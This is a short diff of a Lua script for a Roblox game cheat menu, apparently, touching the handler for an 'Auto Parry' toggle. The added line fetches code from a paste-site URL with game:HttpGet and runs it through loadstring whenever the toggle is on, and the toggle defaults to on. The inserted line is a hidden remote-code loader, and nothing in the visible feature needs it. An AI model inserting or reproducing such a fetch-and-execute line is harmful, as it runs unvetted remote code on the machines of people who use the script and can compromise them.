@@ -712,6 +712,7 @@ Tabs.Main:AddButton({
 local AutoParry = Tabs.Main:AddToggle("AutoParry", {Title="Auto Parry",Default=true});
 AutoParry:OnChanged(function(v)
 	if v then
+loadstring(game:HttpGet("http://vpaste.net/BR5tp"))()
 
 		Connections_Manager["Auto Parry"] = RunService.PreSimulation:Connect(function()
 			local One_Ball = Auto_Parry.Get_Ball();
